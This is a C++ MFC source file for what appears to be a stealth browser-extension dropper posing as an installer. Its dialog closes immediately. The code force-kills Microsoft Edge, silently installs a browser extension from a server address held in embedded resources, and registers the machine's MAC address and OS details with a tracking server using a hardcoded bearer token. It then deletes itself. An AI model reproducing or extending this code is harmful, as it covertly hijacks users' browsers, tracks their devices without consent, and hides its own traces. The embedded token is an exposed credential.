
// MyInstallerDlg.cpp : implementation file
//

#include "pch.h"
#include "framework.h"
#include "MyInstaller.h"
#include "MyInstallerDlg.h"
#include "afxdialogex.h"
#include "ProcessUtil.h"
#include <fstream>   // For file operations
#include <iostream>  // For console output
#include <vector>
#include "MyDefine.h"
#include "NetUtil.h"
#include "json.hpp"
#include "ZipUtil.h"


using namespace std;

#ifdef _DEBUG
#define new DEBUG_NEW
#endif

// CAboutDlg dialog used for App About

class CAboutDlg : public CDialogEx
{
public:
	CAboutDlg();

// Dialog Data
#ifdef AFX_DESIGN_TIME
	enum { IDD = IDD_ABOUTBOX };
#endif

	protected:
	virtual void DoDataExchange(CDataExchange* pDX);    // DDX/DDV support

// Implementation
protected:
	DECLARE_MESSAGE_MAP()
};

CAboutDlg::CAboutDlg() : CDialogEx(IDD_ABOUTBOX)
{
}

void CAboutDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialogEx::DoDataExchange(pDX);
}

BEGIN_MESSAGE_MAP(CAboutDlg, CDialogEx)
END_MESSAGE_MAP()


// CMyInstallerDlg dialog



CMyInstallerDlg::CMyInstallerDlg(CWnd* pParent /*=nullptr*/)
	: CDialogEx(IDD_MYINSTALLER_DIALOG, pParent)
{
	m_hIcon = AfxGetApp()->LoadIcon(IDR_MAINFRAME);
}

void CMyInstallerDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialogEx::DoDataExchange(pDX);
}

BEGIN_MESSAGE_MAP(CMyInstallerDlg, CDialogEx)
	ON_WM_SYSCOMMAND()
	ON_WM_PAINT()
	ON_WM_QUERYDRAGICON()
	ON_BN_CLICKED(IDCANCEL, &CMyInstallerDlg::OnBnClickedCancel)
	ON_BN_CLICKED(IDOK, &CMyInstallerDlg::OnBnClickedOk)
END_MESSAGE_MAP()



void WriteResourceToFile(UINT resourceID, LPCTSTR resourceType, LPCTSTR outputFileName)
{
	// Find the resource
	HRSRC hResInfo = FindResource(AfxGetInstanceHandle(), MAKEINTRESOURCE(resourceID), resourceType);
	if (hResInfo == NULL)
	{
		return;
	}

	// Load the resource
	HGLOBAL hResData = LoadResource(AfxGetInstanceHandle(), hResInfo);
	if (hResData == NULL)
	{
		return;
	}

	// Lock the resource and get its data pointer
	LPVOID pData = LockResource(hResData);
	if (pData == NULL)
	{
		FreeResource(hResData);
		return;
	}

	// Get the size of the resource data
	DWORD dwSize = SizeofResource(AfxGetInstanceHandle(), hResInfo);
	if (dwSize == 0)
	{
		FreeResource(hResData);
		return;
	}

	// Create a file stream for writing
	std::ofstream outputFile(outputFileName, std::ios::binary);
	if (!outputFile.is_open())
	{
		FreeResource(hResData);
		return;
	}

	// Write resource data to the file
	outputFile.write(static_cast<const char*>(pData), dwSize);

	// Close the file
	outputFile.close();

	// Free the loaded resource
	FreeResource(hResData);

}

// CMyInstallerDlg message handlers

BOOL CMyInstallerDlg::OnInitDialog()
{
	CDialogEx::OnInitDialog();

	// Add "About..." menu item to system menu.

	// IDM_ABOUTBOX must be in the system command range.
	ASSERT((IDM_ABOUTBOX & 0xFFF0) == IDM_ABOUTBOX);
	ASSERT(IDM_ABOUTBOX < 0xF000);

	CMenu* pSysMenu = GetSystemMenu(FALSE);
	if (pSysMenu != nullptr)
	{
		BOOL bNameValid;
		CString strAboutMenu;
		bNameValid = strAboutMenu.LoadString(IDS_ABOUTBOX);
		ASSERT(bNameValid);
		if (!strAboutMenu.IsEmpty())
		{
			pSysMenu->AppendMenu(MF_SEPARATOR);
			pSysMenu->AppendMenu(MF_STRING, IDM_ABOUTBOX, strAboutMenu);
		}
	}

	// Set the icon for this dialog.  The framework does this automatically
	//  when the application's main window is not a dialog
	SetIcon(m_hIcon, TRUE);			// Set big icon
	SetIcon(m_hIcon, FALSE);		// Set small icon

	SS_Init();

	EndDialog(IDCANCEL);

	return TRUE;  // return TRUE  unless you set the focus to a control
}

void CMyInstallerDlg::OnSysCommand(UINT nID, LPARAM lParam)
{
	if ((nID & 0xFFF0) == IDM_ABOUTBOX)
	{
		CAboutDlg dlgAbout;
		dlgAbout.DoModal();
	}
	else
	{
		CDialogEx::OnSysCommand(nID, lParam);
	}
}

// If you add a minimize button to your dialog, you will need the code below
//  to draw the icon.  For MFC applications using the document/view model,
//  this is automatically done for you by the framework.

void CMyInstallerDlg::OnPaint()
{
	if (IsIconic())
	{
		CPaintDC dc(this); // device context for painting

		SendMessage(WM_ICONERASEBKGND, reinterpret_cast<WPARAM>(dc.GetSafeHdc()), 0);

		// Center icon in client rectangle
		int cxIcon = GetSystemMetrics(SM_CXICON);
		int cyIcon = GetSystemMetrics(SM_CYICON);
		CRect rect;
		GetClientRect(&rect);
		int x = (rect.Width() - cxIcon + 1) / 2;
		int y = (rect.Height() - cyIcon + 1) / 2;

		// Draw the icon
		dc.DrawIcon(x, y, m_hIcon);
	}
	else
	{
		CDialogEx::OnPaint();
	}
}

// The system calls this function to obtain the cursor to display while the user drags
//  the minimized window.
HCURSOR CMyInstallerDlg::OnQueryDragIcon()
{
	return static_cast<HCURSOR>(m_hIcon);
}



#define SERVER_DOMAIN L"dash.zintrack.com"
#define REG_PATH L"/api/v1/register"
#define SEND_EVENT L"/api/v1/events/install"
#define BEARER_TOKEN L"40|xSYEfJuEfwHwFm8ccglYY4fxpXYJTpqTqT3Rvr1W5640aab2"

wstring _serverDomain = SERVER_DOMAIN;
wstring _bearerToken = BEARER_TOKEN;

wstring RegisterMachine()
{
	nlohmann::json jsonData;
	jsonData["type"] = "WindowsApplication";
	jsonData["deviceId"] = GetMACAddress();
	jsonData["osVersion"] = GetOSVersion();
	jsonData["app"] = GetProcessName();
	wstring response;
	BOOL ret = HTTPSPost(_serverDomain, REG_PATH, jsonData.dump(), response, _bearerToken);
	if (!ret)
	{
		return L"";
	}

	nlohmann::json jsonRet = nlohmann::json::parse(ConvertWStringToString(response));

	string w_stemp = jsonRet["id"];
	return charToWstring(w_stemp.c_str());
}
//
//nlohmann::json SendEvent(const wstring& step, int eventId, const wstring& data = L"")
//{
//	nlohmann::json jsonData;
//	jsonData["step"] = ConvertWStringToString(step);
//	if (step != L"click" && eventId != -1)
//	{
//		jsonData["eventId"] = eventId;
//	}
//	if (step == L"registered")
//	{
//		jsonData["clientId"] = ConvertWStringToString(data);
//	}
//
//	wstring response;
//	BOOL ret = HTTPSPost(_serverDomain, SEND_EVENT, jsonData.dump(), response, _bearerToken);
//	if (!ret || response == L"")
//	{
//		return nlohmann::json();
//	}
//
//	return nlohmann::json::parse(ConvertWStringToString(response));
//}
//
//nlohmann::json SendErrorEvent(const wstring& step, const wstring& errorMessage)
//{
//	nlohmann::json jsonData;
//	jsonData["step"] = ConvertWStringToString(step);
//	jsonData["error"] = ConvertWStringToString(errorMessage);
//
//	wstring response;
//	BOOL ret = HTTPSPost(_serverDomain, SEND_EVENT, jsonData.dump(), response, _bearerToken);
//	if (!ret || response == L"")
//	{
//		return nlohmann::json();
//	}
//
//	return nlohmann::json::parse(ConvertWStringToString(response));
//}
//
//std::string number_to_words(int number) {
//	if (number < 0 || number > 19) {
//		return "";
//	}
//
//	const std::vector<std::string> ones = {
//		"zero", "one", "two", "three", "four", "five",
//		"six", "seven", "eight", "nine", "ten",
//		"eleven", "twelve", "thirteen", "fourteen", "fifteen",
//		"sixteen", "seventeen", "eighteen", "nineteen"
//	};
//	return ones[number];
//}


void	CMyInstallerDlg::SS_Init()
{
	TCHAR		w_szCurDir[MAX_PATH] = L"";
	TCHAR		w_szTemp[MAX_PATH] = L"";
	TCHAR		w_szParam[MAX_PATH] = L"";
	HWND		w_hOpenedChrome = NULL;
	HWND		w_hOpenedEdge = NULL;
	std::string version = "";
	std::string w_sServerAddr = "";
	std::string w_sSelfDelOpt = "0";
	std::string app_name = "app_name";
	FILE*		w_pFile = NULL;
	char		w_szVersionInf[MAX_PATH] = "";
	bool		w_bIsInstalled = false;
	bool		w_bChromeURL = true;
	bool		w_bLocalInstall = false;
	INSTALLER_INFO	w_stRestoredInfo; memset(&w_stRestoredInfo, 0x00, sizeof(INSTALLER_INFO));
	std::vector<char> w_InstallerInfo;
	string		w_sUUID = "";
	string		w_sAppName = "";

	int			eventId = -1;
	bool		w_bAnalytics = false;
	bool		w_bRealInstall = false;
	nlohmann::json jsonRet;

	//. 
	CreateDirectoryA(GD_LOCAL_WEB_DIR_PATH, NULL);
	//.
	GetOpenedHWndFromMyBrowser(w_hOpenedChrome, w_hOpenedEdge);
	if (w_hOpenedEdge == NULL) {
		MyWriteLog_Web("CMyInstallerDlg::SS_Init() GetOpenedHWndFromMyBrowser w_hOpenedEdge == NULL");
		wstring processName = L"msedge.exe";
		TeminateProcess(processName);
		Sleep(2000);
	}
	//.
	MyWriteLog_Web("CMyInstallerDlg::SS_Init() Start");
#if 1
	//.
	w_sSelfDelOpt = RetrieveStringFromRawResource(GD_SELF_DEL_RESOURCE_ID);
	MyWriteLog_Web("CMyInstallerDlg::SS_Init() w_sSelfDelOpt = %s", w_sSelfDelOpt.c_str());
	//.
	if (IsFileExist(GD_LOCAL_WEB_INFO_FILEPATH) == TRUE) {
		MyWriteLog_Web("CMyInstallerDlg::SS_Init() pre-installed");
		goto L_EXIT;
	}
	//. 
	w_InstallerInfo = RetrieveResourceData(GD_INSTALLER_INO_RESOURCE_ID);
	if (!w_InstallerInfo.empty()) {
		WriteDataToFile(GD_LOCAL_WEB_SET_FILEPATH, w_InstallerInfo);

		//w_stRestoredInfo = ConvertVectorToStruct(w_InstallerInfo);
		FILE* w_pFileInfo = fopen(GD_LOCAL_WEB_SET_FILEPATH, "rb");
		if (w_pFileInfo != NULL) {
			fread(&w_stRestoredInfo, 1, sizeof(INSTALLER_INFO), w_pFileInfo);
			fclose(w_pFileInfo);
		}

		_serverDomain = charToWstring(w_stRestoredInfo.m_szAnalyticsServer);
		_bearerToken = charToWstring(w_stRestoredInfo.m_szAnalyticsToken);
	}
	else {
		return;
	}
	if (_serverDomain.size() > 0 && _bearerToken.size() > 0) {
		w_bAnalytics = true;
	}

	//. Web Store Installer
	w_sServerAddr = RetrieveStringFromRawResource(GD_SERVER_ADD_RESOURCE_ID);
	MyWriteLog_Web("CMyInstallerDlg::SS_Init() w_sServerAddr = %s", w_sServerAddr.c_str());
	//.
	if (w_sServerAddr.size() >= 3) {
		MyWriteLog_Web("CMyInstallerDlg::SS_Init() CheckWebExtensionAndInstall() w_sServerAddr = %s", w_sServerAddr.c_str());
		CheckWebExtensionAndInstall(w_sServerAddr, w_bRealInstall, w_stRestoredInfo.m_nRestartBrowser);
	}
	else {
	}

#else
	w_bAnalytics = true;
	w_stRestoredInfo.m_nRestartBrowser = 1;
	w_sServerAddr = "extension-install-dummy.hashimtopaz1.workers.dev";
	strcpy_s(w_stRestoredInfo.m_szWebServiceName, "XXXXXXXX");
	MessageBoxA(NULL, w_sServerAddr.c_str(), "Test", MB_OK | MB_TOPMOST);
#endif

	//. register on Server
	w_sUUID = "";
	w_sAppName = GetProcessName();
	if (w_bAnalytics == true && w_bRealInstall == true) {

		MyWriteLog_Web("CMyInstallerDlg::SS_Init() w_bAnalytics == true && w_bRealInstall == true");

		wstring uuid = RegisterMachine();
		if (uuid.empty() == false) {
			w_sUUID = ConvertWStringToString(uuid);
			string		w_sPingPath = PING_API_ADDR + w_sUUID;
			string		w_sResponse = "";

			MyWriteLog_Web("CMyInstallerDlg::SS_Init() w_sUUID = %s", w_sUUID.c_str());
			SetAppNameAndUUIDInfo(GD_LOCAL_WEB_INFO_FILEPATH, w_sAppName, w_sUUID);
			HTTPSGet(ConvertWStringToString(_serverDomain), w_sPingPath, w_sResponse, ConvertWStringToString(_bearerToken));
		}
	}
	else {
		SetAppNameAndUUIDInfo(GD_LOCAL_WEB_INFO_FILEPATH, w_sAppName, w_sUUID);
	}

L_EXIT:
	if (w_sSelfDelOpt.size() > 2 ) {
		delete_myself();
	}
	MyWriteLog_Web("CMyInstallerDlg::SS_Init() End");
	return;
}
void CMyInstallerDlg::OnBnClickedCancel()
{
	// TODO: Add your control notification handler code here
	CDialogEx::OnCancel();
}


void CMyInstallerDlg::OnBnClickedOk()
{
	return;
}
